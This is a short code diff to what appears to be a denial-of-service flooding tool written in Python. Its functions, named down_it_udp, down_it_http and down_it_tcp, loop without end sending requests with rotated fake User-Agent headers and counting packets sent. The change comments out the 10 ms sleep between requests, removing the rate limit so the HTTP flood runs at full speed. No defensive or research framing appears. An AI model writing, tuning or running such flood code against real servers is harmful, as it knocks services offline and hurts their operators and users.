@@ -51,8 +51,9 @@ def down_it_udp(_ctx: Context):
 
 
 def down_it_http(_ctx: Context):
+    http_headers = _ctx.headers
+
     while True:
-        http_headers = _ctx.headers
         http_headers['User-Agent'] = random.choice(_ctx.user_agents).strip()
 
         try:
@@ -70,7 +71,7 @@ def down_it_http(_ctx: Context):
 
         _ctx.packets_sent += 1
         show_statistics(_ctx)
-        time.sleep(.01)
+        # time.sleep(.01)
 
 
 def down_it_tcp(_ctx: Context):
